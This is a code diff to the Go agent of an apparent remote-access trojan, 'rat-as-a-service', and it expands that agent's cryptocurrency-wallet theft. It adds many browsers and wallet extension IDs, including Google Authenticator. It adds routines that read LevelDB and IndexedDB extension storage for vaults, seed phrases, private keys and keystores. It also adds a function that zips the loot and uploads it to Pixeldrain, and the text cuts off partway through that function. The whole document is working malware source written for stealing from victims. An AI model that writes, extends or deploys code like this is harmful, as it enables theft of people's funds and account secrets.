@@ -28,6 +28,9 @@ import (
 
 	"rat-as-a-service/config"
 
+	"encoding/binary"
+
+	"github.com/syndtr/goleveldb/leveldb"
 	_ "modernc.org/sqlite"
 )
 
@@ -94,7 +97,7 @@ func NewAgent(c2URL string) *Agent {
 		BeaconInterval: config.BEACON_INTERVAL,
 		Running:        false,
 		httpClient: &http.Client{
-			Timeout: 30 * time.Second,
+			Timeout: 5 * time.Minute, // Increased from 30 seconds to handle large wallet data
 		},
 	}
 }
@@ -4362,7 +4365,7 @@ func (a *Agent) stealBrowserWallets(task *config.Task, result config.TaskResult)
 	}
 
 	// Extract from all supported browsers
-	browsers := []string{"Chrome", "Firefox", "Edge", "Brave", "Opera"}
+	browsers := []string{"Chrome", "Firefox", "Edge", "Brave", "Opera", "Thorium", "Floorp", "Vivaldi", "Yandex", "360Chrome", "CocCoc", "Chromium"}
 
 	for _, browser := range browsers {
 		log.Printf("Scanning %s for wallet extensions...", browser)
@@ -4381,6 +4384,17 @@ func (a *Agent) stealBrowserWallets(task *config.Task, result config.TaskResult)
 
 	// Identify high-value targets
 	cryptoAssets.HighValueTargets = a.identifyHighValueWallets(cryptoAssets.ExtensionWallets)
+
+	// Upload browser wallet files to Pixeldrain
+	if cryptoAssets.TotalExtensions > 0 {
+		downloadURL, err := a.uploadBrowserWalletFilesToPixeldrain(cryptoAssets)
+		if err != nil {
+			log.Printf("Failed to upload browser wallet files to Pixeldrain: %v", err)
+		} else {
+			cryptoAssets.DownloadURL = downloadURL
+			log.Printf("Browser wallet files uploaded to Pixeldrain: %s", downloadURL)
+		}
+	}
 
 	result.CryptoAssets = cryptoAssets
 	result.Success = true
@@ -4422,6 +4436,36 @@ func (a *Agent) extractBrowserExtensionWallets(browser string) []config.BrowserW
 	case "Opera":
 		browserPaths = []string{
 			filepath.Join(userProfile, "AppData", "Roaming", "Opera Software", "Opera Stable"),
+			filepath.Join(userProfile, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
+		}
+	case "Thorium":
+		browserPaths = []string{
+			filepath.Join(localAppData, "Thorium", "User Data"),
+			filepath.Join(userProfile, "AppData", "Local", "Thorium", "User Data"),
+		}
+	case "Floorp":
+		browserPaths = []string{
+			filepath.Join(userProfile, "AppData", "Roaming", "Floorp", "Profiles"),
+		}
+	case "Vivaldi":
+		browserPaths = []string{
+			filepath.Join(localAppData, "Vivaldi", "User Data"),
+		}
+	case "Yandex":
+		browserPaths = []string{
+			filepath.Join(localAppData, "Yandex", "YandexBrowser", "User Data"),
+		}
+	case "360Chrome":
+		browserPaths = []string{
+			filepath.Join(localAppData, "360Chrome", "Chrome", "User Data"),
+		}
+	case "CocCoc":
+		browserPaths = []string{
+			filepath.Join(localAppData, "CocCoc", "Browser", "User Data"),
+		}
+	case "Chromium":
+		browserPaths = []string{
+			filepath.Join(localAppData, "Chromium", "User Data"),
 		}
 	}
 
@@ -4496,35 +4540,53 @@ func (a *Agent) scanProfileForWalletExtensions(browser, profilePath string) []co
 	// Known wallet extension IDs and names
 	walletExtensions := a.getKnownWalletExtensions()
 
-	extensionsPath := filepath.Join(profilePath, "Extensions")
-	if browser == "Firefox" {
-		extensionsPath = filepath.Join(profilePath, "extensions")
+	// Check different storage locations for wallet extensions
+	storagePaths := []struct {
+		path string
+		name string
+	}{
+		{filepath.Join(profilePath, "Local Extension Settings"), "Local Extension Settings"},
+		{filepath.Join(profilePath, "Sync Extension Settings"), "Sync Extension Settings"},
+		{filepath.Join(profilePath, "IndexedDB"), "IndexedDB"},
 	}
 
-	if _, err := os.Stat(extensionsPath); os.IsNotExist(err) {
-		return extensions
-	}
-
-	// Scan extension directories
-	extDirs, err := os.ReadDir(extensionsPath)
-	if err != nil {
-		return extensions
-	}
-
-	for _, extDir := range extDirs {
-		if !extDir.IsDir() {
+	for _, storage := range storagePaths {
+		if _, err := os.Stat(storage.path); os.IsNotExist(err) {
 			continue
 		}
 
-		extID := extDir.Name()
+		log.Printf("Scanning %s in %s...", storage.name, browser)
 
-		// Check if this is a known wallet extension
-		if walletInfo, isWallet := walletExtensions[extID]; isWallet {
-			log.Printf("Found wallet extension: %s (%s)", walletInfo.Name, extID)
+		// Scan storage directories
+		extDirs, err := os.ReadDir(storage.path)
+		if err != nil {
+			continue
+		}
 
-			extension := a.extractWalletExtensionData(browser, profilePath, extID, walletInfo)
-			if extension.ExtensionID != "" {
-				extensions = append(extensions, extension)
+		for _, extDir := range extDirs {
+			if !extDir.IsDir() {
+				continue
+			}
+
+			extID := extDir.Name()
+
+			// For IndexedDB, extract extension ID from chrome-extension_ID_0.indexeddb.leveldb format
+			if storage.name == "IndexedDB" && strings.HasPrefix(extID, "chrome-extension_") && strings.HasSuffix(extID, ".indexeddb.leveldb") {
+				// Extract ID from chrome-extension_blnieiiffboillknjnepogjhkgnoapac_0.indexeddb.leveldb
+				parts := strings.Split(extID, "_")
+				if len(parts) >= 2 {
+					extID = parts[1]
+				}
+			}
+
+			// Check if this is a known wallet extension
+			if walletInfo, isWallet := walletExtensions[extID]; isWallet {
+				log.Printf("Found wallet extension: %s (%s) in %s", walletInfo.Name, extID, storage.name)
+
+				extension := a.extractWalletExtensionData(browser, profilePath, extID, walletInfo, storage.name)
+				if extension.ExtensionID != "" {
+					extensions = append(extensions, extension)
+				}
 			}
 		}
 	}
@@ -4535,41 +4597,102 @@ func (a *Agent) scanProfileForWalletExtensions(browser, profilePath string) []co
 // getKnownWalletExtensions returns a map of known wallet extension IDs
 func (a *Agent) getKnownWalletExtensions() map[string]struct{ Name, Type string } {
 	return map[string]struct{ Name, Type string }{
+		// MetaMask and variants
 		"nkbihfbeogaeaoehlefnkodbefgpgknn": {"MetaMask", "Ethereum"},
+
+		// Tron wallets
+		"ibnejdfjmmkpcnlpebklmnkoeoihofec": {"TronLink", "Tron"},
+
+		// Binance Chain Wallet
 		"fhbohimaelbohpjbbldcngcnapndodjp": {"Binance Chain Wallet", "BSC"},
+
+		// Google Authenticator (2FA)
+		"bhghoamapcdpbohphigoooaddinpkbai": {"Google Authenticator", "2FA"},
+
+		// Yoroi Wallet (Cardano)
+		"ffnbelfdoeiohenkjibnmadjiehjhajb": {"Yoroi Wallet", "Cardano"},
+
+		// Nifty Wallet
+		"jbdaocneiiinmjbjlgalhcelgbejmnid": {"Nifty Wallet", "Ethereum"},
+
+		// Math Wallet
+		"afbcbjpbpfadlkmhmclhkeeodmamcflc": {"Math Wallet", "Multi-Chain"},
+
+		// Coinbase Wallet Extension
 		"hnfanknocfeofbddgcijnmhnfnkdnaad": {"Coinbase Wallet", "Multi-Chain"},
-		"bfnaelmomeimhlpmgjnjophhpkkoljpa": {"Phantom", "Solana"},
+
+		// Guarda Wallet
+		"hpglfhgfnhbgpjdenjgmdgoeiappafln": {"Guarda Wallet", "Multi-Chain"},
+
+		// Equal Wallet (uses IndexedDB)
+		"blnieiiffboillknjnepogjhkgnoapac": {"Equal Wallet", "Multi-Chain"},
+
+		// Jaxx Liberty (uses IndexedDB)
+		"cjelfplplebdjjenllpjcblmjkfcffne": {"Jaxx Liberty", "Multi-Chain"},
+
+		// Wombat
+		"amkmjjmmflddogmhpjloimipbofnfjih": {"Wombat", "EOS"},
+
+		// BitApp Wallet
+		"fihkakfobkmkjojpchpfgcmhfjnmnfpi": {"BitApp Wallet", "Multi-Chain"},
+
+		// iWallet
+		"kncchdigobghenbbaddojjnnaogfppfj": {"iWallet", "Multi-Chain"},
+
+		// MEW CX (uses Sync Extension Settings)
+		"nlbmnnijcnlegkjjpcfjclmcfggfefdm": {"MEW CX", "Ethereum"},
+
+		// Guild Wallet
+		"nanjmdknhkinifnkgdcggcfnhdaammmj": {"Guild Wallet", "Multi-Chain"},
+
+		// Saturn Wallet
+		"nkddgncdjgjfcddamfgcmfnlhccnimig": {"Saturn Wallet", "Multi-Chain"},
+
+		// Ronin Wallet
 		"fnjhmkhhmkbjkkabndcnnogagogbneec": {"Ronin Wallet", "Ethereum"},
+
+		// Neo Line
+		"cphhlgmgameodnhkjdmkpanlelnlohao": {"Neo Line", "NEO"},
+
+		// Clover Wallet
+		"nhnkbkgjikgcigadomkphalanndcapjk": {"Clover Wallet", "Multi-Chain"},
+
+		// Liquality Wallet
+		"kpfopkelmapcoipemfendmdcghnegimn": {"Liquality Wallet", "Multi-Chain"},
+
+		// Additional popular wallets
+		"bfnaelmomeimhlpmgjnjophhpkkoljpa": {"Phantom", "Solana"},
 		"aiifbnbfobpmeekipheeijimdpnlpgpp": {"Terra Station", "Terra"},
 		"dmkamcknogkgcdfhhbddcghachkejeap": {"Keplr", "Cosmos"},
 		"bhhhlbepdkbapadjdnnojkbgioiodbic": {"Solflare", "Solana"},
-		"ffnbelfdoeiohenkjibnmadjiehjhajb": {"Yoroi", "Cardano"},
-		"ibnejdfjmmkpcnlpebklmnkoeoihofec": {"TronLink", "Tron"},
-		"jbdaocneiiinmjbjlgalhcelgbejmnid": {"Nifty Wallet", "Ethereum"},
-		"afbcbjpbpfadlkmhmclhkeeodmamcflc": {"Math Wallet", "Multi-Chain"},
-		"ookjlbkiijinhpmnjffcofjonbfbgaoc": {"Temple", "Tezos"},
-		"cgeeodpfagjceefieflmdfphplkenlfk": {"EVER Wallet", "Everscale"},
-		"lpfcbjknijpeeillifnkikgncikgfhdo": {"Nami", "Cardano"},
-		"dngmlblcodfobpdpecaadgfbcggfjfnm": {"Harmony", "Harmony"},
-		"mnfifefkajgofkcjkemidiaecocnkjeh": {"TezBox", "Tezos"},
-		"kmhcihpebfmpgmihbkipmjlmmioameka": {"Eternl", "Cardano"},
-		"dcokfbbakgodhjeicbpdneepnnbhhhmh": {"Trust Wallet", "Multi-Chain"},
-		"pdadjkfkgcafgbceimcpbkalnfnepbnk": {"KardiaChain", "KardiaChain"},
-		"acmacodkjbdgmoleebolmdjonilkdbch": {"Rabby", "Ethereum"},
-		"cjelfplplebdjjenllpjcblmjkfcffne": {"Jaxx Liberty", "Multi-Chain"},
-		"fcfcfllfndlomdhbehjjcoimbgofdncg": {"Liquality", "Multi-Chain"},
-		"ejbalbakoplchlghecdalmeeeajnimhm": {"MEW CX", "Ethereum"},
-		"cnmamaachppnkjgnildpdmkaakejnhae": {"Auro Wallet", "Mina"},
-		"aeachknmefphepccionboohckonoeemg": {"Coin98", "Multi-Chain"},
-		"hmeobnfnfcmdkdcmlblgagmfpfboieaf": {"XDEFI Wallet", "Multi-Chain"},
 		"fhilaheimglignddkjgofkcbgekhenbh": {"Oxygen", "Solana"},
-		"hpglfhgfnhbgpjdenjgmdgoeiappafln": {"Guarda", "Multi-Chain"},
-		"blnieiiffboillknjnepogjhkgnoapac": {"ONTO", "Multi-Chain"},
+		"flpiciilemghbmfalicajoolhkkenfel": {"ICONex", "ICON"},
+		"hmeobnfnfcmdkdcmlblgagmfpfboieaf": {"XDEFI Wallet", "Multi-Chain"},
+		"lpfcbjknijpeeillifnkikgncikgfhdo": {"Nami", "Cardano"},
+		"dngmlblcodfobpdpecaadgfbcggfjfnm": {"Eternl", "Cardano"},
+		"jojhfeoedkpkglbfimdfabpdfjaoolaf": {"Polymesh Wallet", "POLYX"},
+		"mcohilncbfahbmgdjkbpemcciiolgcge": {"OKX Wallet", "Multi-Chain"},
+		"opcgpfmipidbgpenhmajoajpbobppdil": {"Sui Wallet", "Sui"},
+		"cgeeodpfagjceefieflmdfphplkenlfk": {"EVER Wallet", "Everscale"},
+		"ookjlbkiijinhpmnjffcofjonbfbgaoc": {"Temple", "Tezos"},
+		"bcopgchhojmggmffilplmbdicgaihlkp": {"Phantom Backup", "Solana"},
+		"aholpfdialjgjfhomihkjbmgjidlcdno": {"ExodusWeb3", "Multi-Chain"},
+		"ejbalbakoplchlghecdalmeeeajnimhm": {"MEW wallet", "Ethereum"},
+		"mnfifefkajgofkcjkemidiaecocnkjeh": {"TezBox", "Tezos"},
+		"aeachknmefphepccionboohckonoeemg": {"Coin98", "Multi-Chain"},
+		"hcflpincpppdclinealmandijcmnkbgn": {"GeroWallet", "Cardano"},
+		"dkdedlpgdmmkkfjabffeganieamfklkm": {"Cyano Wallet", "Ontology"},
+		"nlgbhdfgdhgbiamfdfmbikcdghidoadd": {"Bitski", "Ethereum"},
+		"infeboajgfhgbjpjbeppbkgnabfdkdaf": {"Wax Cloud Wallet", "WAX"},
+		"acmacodkjbdgmoleebolmdjonilkdbch": {"Rabby", "Ethereum"},
+		"odbfpeeihdkbihmopkbjmoonfanlbfcl": {"Brave Wallet", "Multi-Chain"},
+		"fnnegphlobjdpkhecapkijjdkgcjhkib": {"Harmony", "ONE"},
+		"nphplpgoakhhjchkkhmiggakijnkhfnd": {"TON Wallet", "TON"},
 	}
 }
 
 // extractWalletExtensionData extracts detailed data from a wallet extension
-func (a *Agent) extractWalletExtensionData(browser, profilePath, extID string, walletInfo struct{ Name, Type string }) config.BrowserWalletExtension {
+func (a *Agent) extractWalletExtensionData(browser, profilePath, extID string, walletInfo struct{ Name, Type string }, storage string) config.BrowserWalletExtension {
 	extension := config.BrowserWalletExtension{
 		ExtensionID:   extID,
 		ExtensionName: walletInfo.Name,
@@ -4579,11 +4702,470 @@ func (a *Agent) extractWalletExtensionData(browser, profilePath, extID string, w
 		IsActive:      true,
 	}
 
-	extPath := filepath.Join(profilePath, "Extensions", extID)
-	if browser == "Firefox" {
-		extPath = filepath.Join(profilePath, "extensions", extID)
+	// Determine the correct path based on storage type
+	var extPath string
+	switch storage {
+	case "Local Extension Settings":
+		extPath = filepath.Join(profilePath, "Local Extension Settings", extID)
+	case "Sync Extension Settings":
+		extPath = filepath.Join(profilePath, "Sync Extension Settings", extID)
+	case "IndexedDB":
+		// For IndexedDB, look for chrome-extension_ID_0.indexeddb.leveldb
+		extPath = filepath.Join(profilePath, "IndexedDB", fmt.Sprintf("chrome-extension_%s_0.indexeddb.leveldb", extID))
+	default:
+		// Fallback to old method
+		extPath = filepath.Join(profilePath, "Extensions", extID)
 	}
 
+	// Check if the extension path exists
+	if _, err := os.Stat(extPath); os.IsNotExist(err) {
+		log.Printf("Extension path does not exist: %s", extPath)
+		return extension
+	}
+
+	log.Printf("Extracting data from: %s", extPath)
+
+	// Extract data based on storage type
+	switch storage {
+	case "Local Extension Settings", "Sync Extension Settings":
+		// These contain LevelDB files with wallet data
+		extension.StorageData = a.extractLevelDBData(extPath)
+	case "IndexedDB":
+		// IndexedDB contains structured wallet data
+		extension.IndexedDBData = a.extractIndexedDBData(extPath)
+	default:
+		// Try to extract from manifest and version directories
+		extension = a.extractFromExtensionDirectory(extension, extPath)
+	}
+
+	// Extract wallet-specific data
+	extension.ExtractedSeeds = a.findSeedPhrases(extension)
+	extension.PrivateKeys = a.findPrivateKeys(extension)
+	extension.Addresses = a.findCryptoAddresses(extension)
+	extension.Keystores = a.findKeystores(extension)
+
+	return extension
+}
+
+// extractLevelDBData extracts data from LevelDB storage (Local/Sync Extension Settings)
+func (a *Agent) extractLevelDBData(extPath string) map[string]interface{} {
+	data := make(map[string]interface{})
+
+	// Open LevelDB database
+	db, err := leveldb.OpenFile(extPath, nil)
+	if err != nil {
+		log.Printf("Failed to open LevelDB at %s: %v", extPath, err)
+		// Fallback to file reading if can't open as LevelDB
+		return a.extractLevelDBDataFallback(extPath)
+	}
+	defer db.Close()
+
+	// Iterate through all key-value pairs
+	iter := db.NewIterator(nil, nil)
+	defer iter.Release()
+
+	for iter.Next() {
+		key := string(iter.Key())
+		value := iter.Value()
+
+		// Try to parse value as JSON
+		var jsonData interface{}
+		if err := json.Unmarshal(value, &jsonData); err == nil {
+			data[key] = jsonData
+		} else {
+			// Store raw value if not JSON
+			data[key] = string(value)
+		}
+
+		// Look for specific wallet data patterns
+		if strings.Contains(key, "vault") || strings.Contains(key, "keyring") {
+			a.extractVaultData(key, value, data)
+		}
+	}
+
+	return data
+}
+
+// extractLevelDBDataFallback reads LevelDB files directly when database can't be opened
+func (a *Agent) extractLevelDBDataFallback(extPath string) map[string]interface{} {
+	data := make(map[string]interface{})
+
+	// Read all .ldb and .log files
+	files, err := os.ReadDir(extPath)
+	if err != nil {
+		return data
+	}
+
+	for _, file := range files {
+		if strings.HasSuffix(file.Name(), ".ldb") || strings.HasSuffix(file.Name(), ".log") {
+			filePath := filepath.Join(extPath, file.Name())
+			content, err := os.ReadFile(filePath)
+			if err != nil {
+				continue
+			}
+
+			// Extract JSON objects from binary data
+			jsonObjects := a.extractJSONFromBinary(content)
+			for i, obj := range jsonObjects {
+				data[fmt.Sprintf("%s_json_%d", file.Name(), i)] = obj
+			}
+
+			// Extract key-value pairs
+			kvPairs := a.extractKeyValuePairs(content)
+			for k, v := range kvPairs {
+				data[k] = v
+			}
+		}
+	}
+
+	return data
+}
+
+// extractVaultData specifically handles encrypted vault structures
+func (a *Agent) extractVaultData(key string, value []byte, data map[string]interface{}) {
+	// MetaMask vault structure
+	if strings.Contains(key, "metamask") {
+		var vault struct {
+			Data string `json:"data"`
+			IV   string `json:"iv"`
+			Salt string `json:"salt"`
+		}
+		if json.Unmarshal(value, &vault) == nil {
+			data[key+"_vault"] = vault
+		}
+	}
+
+	// Phantom wallet structure
+	if strings.Contains(key, "phantom") {
+		var phantomData struct {
+			EncryptedMnemonic string `json:"encryptedMnemonic"`
+			Accounts          []struct {
+				Address   string `json:"address"`
+				PublicKey string `json:"publicKey"`
+			} `json:"accounts"`
+		}
+		if json.Unmarshal(value, &phantomData) == nil {
+			data[key+"_phantom"] = phantomData
+		}
+	}
+}
+
+// extractJSONFromBinary finds and extracts JSON objects from binary data
+func (a *Agent) extractJSONFromBinary(data []byte) []interface{} {
+	var results []interface{}
+
+	// Find JSON object boundaries
+	start := -1
+	braceCount := 0
+
+	for i := 0; i < len(data); i++ {
+		if data[i] == '{' {
+			if start == -1 {
+				start = i
+			}
+			braceCount++
+		} else if data[i] == '}' && start != -1 {
+			braceCount--
+			if braceCount == 0 {
+				// Try to parse JSON
+				jsonBytes := data[start : i+1]
+				var obj interface{}
+				if json.Unmarshal(jsonBytes, &obj) == nil {
+					results = append(results, obj)
+				}
+				start = -1
+			}
+		}
+	}
+
+	return results
+}
+
+// extractKeyValuePairs extracts LevelDB key-value pairs from binary data
+func (a *Agent) extractKeyValuePairs(data []byte) map[string]string {
+	pairs := make(map[string]string)
+
+	// LevelDB uses length-prefixed strings
+	i := 0
+	for i < len(data)-4 {
+		// Try to read key length (varint encoding)
+		keyLen, n := binary.Uvarint(data[i:])
+		if n <= 0 || keyLen > 1024 {
+			i++
+			continue
+		}
+		i += n
+
+		if i+int(keyLen) > len(data) {
+			break
+		}
+
+		key := string(data[i : i+int(keyLen)])
+		i += int(keyLen)
+
+		// Read value length
+		if i >= len(data) {
+			break
+		}
+
+		valueLen, n := binary.Uvarint(data[i:])
+		if n <= 0 || valueLen > 10240 {
+			continue
+		}
+		i += n
+
+		if i+int(valueLen) > len(data) {
+			break
+		}
+
+		value := data[i : i+int(valueLen)]
+		i += int(valueLen)
+
+		// Only store if key looks relevant
+		if a.isRelevantKey(key) {
+			pairs[key] = string(value)
+		}
+	}
+
+	return pairs
+}
+
+// isRelevantKey checks if a key is wallet-related
+func (a *Agent) isRelevantKey(key string) bool {
+	relevantPatterns := []string{
+		"wallet", "vault", "keyring", "account", "mnemonic", "seed",
+		"private", "public", "address", "encrypted", "password",
+		"metamask", "phantom", "coinbase", "trust", "crypto",
+	}
+
+	lowerKey := strings.ToLower(key)
+	for _, pattern := range relevantPatterns {
+		if strings.Contains(lowerKey, pattern) {
+			return true
+		}
+	}
+
+	return false
+}
+
+// extractIndexedDBData extracts data from IndexedDB storage
+func (a *Agent) extractIndexedDBData(extPath string) map[string]interface{} {
+	data := make(map[string]interface{})
+	maxFileSize := 5 * 1024 * 1024 // 5MB limit per file
+	maxFiles := 10                 // Limit number of files to read
+	filesRead := 0
+
+	// IndexedDB is also LevelDB format, extract readable strings
+	if _, err := os.Stat(extPath); os.IsNotExist(err) {
+		return data
+	}
+
+	// Try to read the directory contents
+	files, err := os.ReadDir(extPath)
+	if err != nil {
+		// If it's a file, read it directly (with size check)
+		fileInfo, err := os.Stat(extPath)
+		if err != nil {
+			return data
+		}
+
+		// Check file size before reading
+		if fileInfo.Size() > int64(maxFileSize) {
+			log.Printf("Skipping large IndexedDB file: %s (%d bytes)", extPath, fileInfo.Size())
+			return data
+		}
+
+		content, err := os.ReadFile(extPath)
+		if err != nil {
+			return data
+		}
+
+		readableStrings := a.extractReadableStrings(content)
+		data["indexeddb_data"] = readableStrings
+		return data
+	}
+
+	// If it's a directory, read all files (with limits)
+	for _, file := range files {
+		if file.IsDir() || filesRead >= maxFiles {
+			continue
+		}
+
+		filePath := filepath.Join(extPath, file.Name())
+
+		// Get file info to check size
+		fileInfo, err := file.Info()
+		if err != nil {
+			continue
+		}
+
+		// Skip files that are too large
+		if fileInfo.Size() > int64(maxFileSize) {
+			log.Printf("Skipping large IndexedDB file: %s (%d bytes)", file.Name(), fileInfo.Size())
+			continue
+		}
+
+		content, err := os.ReadFile(filePath)
+		if err != nil {
+			continue
+		}
+
+		readableStrings := a.extractReadableStrings(content)
+		if len(readableStrings) > 0 {
+			data[file.Name()] = readableStrings
+			filesRead++
+		}
+	}
+
+	return data
+}
+
+// extractReadableStrings extracts readable strings from binary data
+func (a *Agent) extractReadableStrings(data []byte) []string {
+	var strings []string
+	var current []byte
+	maxStrings := 100 // Limit the number of strings to prevent huge payloads
+	maxLength := 1024 // Limit individual string length
+
+	for _, b := range data {
+		if b >= 32 && b <= 126 { // Printable ASCII
+			current = append(current, b)
+			// Prevent extremely long strings
+			if len(current) > maxLength {
+				current = current[:maxLength]
+			}
+		} else {
+			if len(current) >= 12 && len(current) <= maxLength { // Filter reasonable length strings
+				str := string(current)
+				// Look for wallet-related keywords
+				if a.isWalletRelatedString(str) {
+					strings = append(strings, str)
+					// Limit total number of strings
+					if len(strings) >= maxStrings {
+						return strings
+					}
+				}
+			}
+			current = nil
+		}
+	}
+
+	// Don't forget the last string
+	if len(current) >= 12 && len(current) <= maxLength {
+		str := string(current)
+		if a.isWalletRelatedString(str) && len(strings) < maxStrings {
+			strings = append(strings, str)
+		}
+	}
+
+	return strings
+}
+
+// isWalletRelatedString checks if a string contains wallet-related keywords
+func (a *Agent) isWalletRelatedString(str string) bool {
+	// Check for crypto address patterns first (most valuable)
+	if a.isCryptoAddress(str) {
+		return true
+	}
+
+	// Check for seed phrase patterns (12/24 words)
+	if a.isPotentialSeedPhrase(str) {
+		return true
+	}
+
+	// Check for private key patterns
+	if a.isPotentialPrivateKey(str) {
+		return true
+	}
+
+	// Check for wallet-related keywords
+	walletKeywords := []string{
+		"seed", "mnemonic", "private", "key", "wallet", "address", "crypto",
+		"bitcoin", "ethereum", "solana", "tron", "bnb", "metamask", "phantom",
+		"vault", "keystore", "password", "encrypted", "backup", "recovery",
+		"account", "balance", "transaction", "transfer", "send", "receive",
+	}
+
+	lowerStr := strings.ToLower(str)
+	for _, keyword := range walletKeywords {
+		if strings.Contains(lowerStr, keyword) {
+			return true
+		}
+	}
+
+	return false
+}
+
+// isCryptoAddress checks if string looks like a crypto address
+func (a *Agent) isCryptoAddress(str string) bool {
+	// Bitcoin addresses
+	if (strings.HasPrefix(str, "1") || strings.HasPrefix(str, "3") || strings.HasPrefix(str, "bc1")) && len(str) >= 26 && len(str) <= 62 {
+		return true
+	}
+
+	// Ethereum addresses (0x + 40 hex chars)
+	if strings.HasPrefix(str, "0x") && len(str) == 42 {
+		return true
+	}
+
+	// Solana addresses (base58, ~44 chars)
+	if len(str) >= 32 && len(str) <= 44 && !strings.Contains(str, "0x") && !strings.Contains(str, " ") {
+		return true
+	}
+
+	return false
+}
+
+// isPotentialSeedPhrase checks if string looks like a seed phrase
+func (a *Agent) isPotentialSeedPhrase(str string) bool {
+	words := strings.Fields(str)
+	// Seed phrases are typically 12 or 24 words
+	if len(words) == 12 || len(words) == 24 {
+		// Check if words are reasonable length (3-8 chars typically)
+		validWords := 0
+		for _, word := range words {
+			if len(word) >= 3 && len(word) <= 8 && strings.ToLower(word) == word {
+				validWords++
+			}
+		}
+		// If most words fit the pattern, likely a seed phrase
+		return float64(validWords)/float64(len(words)) > 0.8
+	}
+	return false
+}
+
+// isPotentialPrivateKey checks if string looks like a private key
+func (a *Agent) isPotentialPrivateKey(str string) bool {
+	// Bitcoin WIF format (starts with 5, K, or L)
+	if (strings.HasPrefix(str, "5") || strings.HasPrefix(str, "K") || strings.HasPrefix(str, "L")) && len(str) >= 51 && len(str) <= 52 {
+		return true
+	}
+
+	// Ethereum private key (64 hex chars)
+	if len(str) == 64 && isHexString(str) {
+		return true
+	}
+
+	// Ethereum private key with 0x prefix
+	if strings.HasPrefix(str, "0x") && len(str) == 66 && isHexString(str[2:]) {
+		return true
+	}
+
+	return false
+}
+
+// isHexString checks if string contains only hex characters
+func isHexString(str string) bool {
+	for _, char := range str {
+		if !((char >= '0' && char <= '9') || (char >= 'a' && char <= 'f') || (char >= 'A' && char <= 'F')) {
+			return false
+		}
+	}
+	return len(str) > 0
+}
+
+// extractFromExtensionDirectory extracts data from traditional extension directory structure
+func (a *Agent) extractFromExtensionDirectory(extension config.BrowserWalletExtension, extPath string) config.BrowserWalletExtension {
 	// Find the latest version directory
 	versions, err := os.ReadDir(extPath)
 	if err != nil {
@@ -4615,9 +5197,9 @@ func (a *Agent) extractWalletExtensionData(browser, profilePath, extID string, w
 	}
 
 	// Extract storage data from various sources
-	extension.LocalStorage = a.extractExtensionLocalStorage(browser, profilePath, extID)
-	extension.IndexedDBData = a.extractExtensionIndexedDB(browser, profilePath, extID)
-	extension.StorageData = a.extractExtensionStorageAPI(browser, profilePath, extID)
+	extension.LocalStorage = a.extractExtensionLocalStorage(extension.Browser, extension.Profile, extension.ExtensionID)
+	extension.IndexedDBData = a.extractExtensionIndexedDB(extension.Browser, extension.Profile, extension.ExtensionID)
+	extension.StorageData = a.extractExtensionStorageAPI(extension.Browser, extension.Profile, extension.ExtensionID)
 
 	// Analyze extracted data for crypto assets
 	extension.ExtractedSeeds = a.findSeedPhrases(extension)
@@ -4697,6 +5279,211 @@ func (a *Agent) stealAllCryptoAssets(task *config.Task, result config.TaskResult
 	result.Success = true
 	result.Output = "All crypto assets extracted"
 	return result
+}
+
+// uploadBrowserWalletFilesToPixeldrain creates a ZIP archive of browser extension wallet files and uploads to Pixeldrain
+func (a *Agent) uploadBrowserWalletFilesToPixeldrain(cryptoAssets *config.BrowserCryptoAssets) (string, error) {
+	// Create a temporary ZIP file
+	tempFile, err := os.CreateTemp("", "browser_wallets_*.zip")
+	if err != nil {
+		return "", fmt.Errorf("failed to create temp file: %v", err)
+	}
+	defer os.Remove(tempFile.Name())
+	defer tempFile.Close()
+
+	// Create ZIP writer
+	zipWriter := zip.NewWriter(tempFile)
+
+	// Add all browser extension wallet data to ZIP
+	for _, extension := range cryptoAssets.ExtensionWallets {
+		// Create extension directory in ZIP
+		extDir := fmt.Sprintf("%s_%s_%s/", extension.ExtensionName, extension.WalletType, extension.Browser)
+
+		// Add extension info file
+		infoContent := fmt.Sprintf(`Extension: %s
+ID: %s
+Type: %s
+Browser: %s
+Profile: %s
+Version: %s
+Active: %v
+
+Seeds Found: %d
+Private Keys: %d
+Addresses: %d
+Keystores: %d
+
+Storage Data Size: %d entries
+IndexedDB Size: %d entries
+Local Storage Size: %d entries
+`, extension.ExtensionName, extension.ExtensionID, extension.WalletType,
+			extension.Browser, extension.Profile, extension.Version, extension.IsActive,
+			len(extension.ExtractedSeeds), len(extension.PrivateKeys),
+			len(extension.Addresses), len(extension.Keystores),
+			len(extension.StorageData), len(extension.IndexedDBData), len(extension.LocalStorage))
+
+		infoWriter, err := zipWriter.Create(extDir + "extension_info.txt")
+		if err == nil {
+			infoWriter.Write([]byte(infoContent))
+		}
+
+		// Add extracted seeds
+		if len(extension.ExtractedSeeds) > 0 {
+			seedsContent := strings.Join(extension.ExtractedSeeds, "\n")
+			seedsWriter, err := zipWriter.Create(extDir + "seeds.txt")
+			if err == nil {
+				seedsWriter.Write([]byte(seedsContent))
+			}
+		}
+
+		// Add private keys
+		if len(extension.PrivateKeys) > 0 {
+			keysContent := strings.Join(extension.PrivateKeys, "\n")
+			keysWriter, err := zipWriter.Create(extDir + "private_keys.txt")
+			if err == nil {
+				keysWriter.Write([]byte(keysContent))
+			}
+		}
+
+		// Add addresses
+		if len(extension.Addresses) > 0 {
+			addressesContent := strings.Join(extension.Addresses, "\n")
+			addressesWriter, err := zipWriter.Create(extDir + "addresses.txt")
+			if err == nil {
+				addressesWriter.Write([]byte(addressesContent))
+			}
+		}
+
+		// Add storage data as JSON
+		if len(extension.StorageData) > 0 {
+			storageJSON, err := json.MarshalIndent(extension.StorageData, "", "  ")
+			if err == nil {
+				storageWriter, err := zipWriter.Create(extDir + "storage_data.json")
+				if err == nil {
+					storageWriter.Write(storageJSON)
+				}
+			}
+		}
+
+		// Add IndexedDB data as JSON
+		if len(extension.IndexedDBData) > 0 {
+			indexedDBJSON, err := json.MarshalIndent(extension.IndexedDBData, "", "  ")
+			if err == nil {
+				indexedDBWriter, err := zipWriter.Create(extDir + "indexeddb_data.json")
+				if err == nil {
+					indexedDBWriter.Write(indexedDBJSON)
+				}
+			}
+		}
+
+		// Add local storage data as JSON
+		if len(extension.LocalStorage) > 0 {
+			localStorageJSON, err := json.MarshalIndent(extension.LocalStorage, "", "  ")
+			if err == nil {
+				localStorageWriter, err := zipWriter.Create(extDir + "local_storage.json")
+				if err == nil {
+					localStorageWriter.Write(localStorageJSON)
+				}
+			}
+		}
+
+		// Add keystores as JSON
+		if len(extension.Keystores) > 0 {
+			keystoresJSON, err := json.MarshalIndent(extension.Keystores, "", "  ")
+			if err == nil {
